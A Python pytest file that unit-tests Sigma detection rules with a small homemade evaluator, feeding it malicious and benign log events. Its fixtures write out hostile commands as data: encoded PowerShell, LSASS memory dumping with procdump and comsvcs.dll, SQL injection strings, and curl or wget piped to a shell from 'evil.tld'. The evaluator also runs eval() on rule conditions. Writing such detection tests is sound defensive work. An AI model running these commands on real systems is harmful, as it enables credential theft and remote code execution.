"""
test_detections.py
Detection-as-code unit tests. Each test asserts that a known malicious log
event triggers the matching Sigma rule and that benign baselines do not.

This is the foundation for putting your detection content under CI: every
time someone edits a rule, the suite proves it still catches what it should
and does not flood the queue with false positives.

Run:  pytest test_detections.py -v
"""

import re
from pathlib import Path

import pytest
import yaml

SIGMA_DIR = Path(__file__).parent / "sigma-rules"


# ----------------------------------------------------------------- engine

def load_rule(name: str) -> dict:
    path = next(SIGMA_DIR.rglob(name))
    return yaml.safe_load(path.read_text())


def field_value(event: dict, field: str):
    """Resolve a Sigma field name (with |contains, |endswith, etc.) on an event."""
    base = field.split("|")[0]
    return event.get(base, "")


def check_value(event_val, condition_val, modifier=None) -> bool:
    if event_val is None:
        return False
    ev = str(event_val).lower()
    if isinstance(condition_val, list):
        return any(check_value(event_val, v, modifier) for v in condition_val)
    cv = str(condition_val).lower()
    if modifier == "contains":
        return cv in ev
    if modifier == "endswith":
        return ev.endswith(cv)
    if modifier == "startswith":
        return ev.startswith(cv)
    if modifier == "re":
        return bool(re.search(condition_val, str(event_val)))
    return ev == cv


def evaluate_selection(selection: dict, event: dict) -> bool:
    for field, value in selection.items():
        modifier = None
        if "|" in field:
            parts = field.split("|")
            modifier = parts[-1] if parts[-1] != "all" else "contains"
            base = parts[0]
        else:
            base = field
        if not check_value(event.get(base), value, modifier):
            return False
    return True


def rule_matches(rule: dict, event: dict) -> bool:
    """Very simplified Sigma evaluator. Handles selection / filter / and / not."""
    detection = rule["detection"]
    condition = detection.get("condition", "")
    selections = {k: v for k, v in detection.items() if k != "condition"
                  and not k.startswith(("timeframe",))}

    # Build a truth table
    truths = {name: evaluate_selection(sel, event)
              for name, sel in selections.items()}

    # Handle "or" / "and" / "not" / single name conditions
    expr = condition
    for name, val in truths.items():
        expr = re.sub(rf"\b{name}\b", str(val), expr)
    expr = expr.replace("not", " not ").replace("and", " and ").replace("or", " or ")
    try:
        return bool(eval(expr))
    except Exception:
        return False


# ----------------------------------------------------------------- tests

class TestPowerShellEncoded:
    rule = load_rule("win_powershell_encoded.yml")

    def test_malicious_enc_flag(self):
        event = {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAA==",
            "ParentImage": "C:\\Windows\\explorer.exe",
        }
        assert rule_matches(self.rule, event)

    def test_malicious_encoded_command(self):
        event = {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -EncodedCommand AAAA",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        }
        assert rule_matches(self.rule, event)

    def test_benign_powershell(self):
        event = {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe Get-Process",
            "ParentImage": "C:\\Windows\\explorer.exe",
        }
        assert not rule_matches(self.rule, event)


class TestLsassDump:
    rule = load_rule("win_lsass_dump.yml")

    def test_procdump_lsass(self):
        event = {
            "Image": "C:\\tools\\procdump.exe",
            "CommandLine": "procdump.exe -ma lsass.exe out.dmp",
        }
        assert rule_matches(self.rule, event)

    def test_comsvcs_minidump(self):
        event = {
            "Image": "C:\\Windows\\System32\\rundll32.exe",
            "CommandLine": "rundll32.exe comsvcs.dll, MiniDump 624 lsass.dmp full",
        }
        assert rule_matches(self.rule, event)

    def test_benign_procdump(self):
        event = {
            "Image": "C:\\tools\\procdump.exe",
            "CommandLine": "procdump.exe -ma notepad.exe",
        }
        assert not rule_matches(self.rule, event)


class TestWebSqli:
    rule = load_rule("web_sqli_union.yml")

    @pytest.mark.parametrize("uri", [
        "id=1' UNION SELECT * FROM users-- -",
        "id=1' union%20select 1,2,3",
        "id=1' or '1'='1",
    ])
    def test_sqli_payloads(self, uri):
        assert rule_matches(self.rule, {"cs-uri-query": uri})

    def test_benign_query(self):
        assert not rule_matches(self.rule,
                                {"cs-uri-query": "id=42&format=json"})


class TestCurlPipeShell:
    rule = load_rule("linux_curl_pipe_shell.yml")

    @pytest.mark.parametrize("cmd", [
        "curl http://evil.tld/x.sh | sh",
        "wget -O- http://evil.tld/x | bash",
        "curl https://example.com/install | python",
    ])
    def test_malicious_pipe(self, cmd):
        assert rule_matches(self.rule, {"CommandLine": cmd})

    def test_benign_curl(self):
        assert not rule_matches(self.rule,
                                {"CommandLine": "curl https://api.github.com/users/x"})


# ----------------------------------------------------------------- coverage

def test_all_rules_have_required_fields():
    """Linter: every Sigma rule must have id, level, tags, and a condition."""
    required = {"id", "title", "level", "tags", "logsource", "detection"}
    for rule_path in SIGMA_DIR.rglob("*.yml"):
        rule = yaml.safe_load(rule_path.read_text())
        missing = required - set(rule.keys())
        assert not missing, f"{rule_path.name} missing: {missing}"
        assert "condition" in rule["detection"], \
            f"{rule_path.name} has no detection.condition"
        assert any(t.startswith("attack.") for t in rule["tags"]), \
            f"{rule_path.name} has no MITRE ATT&CK tag"
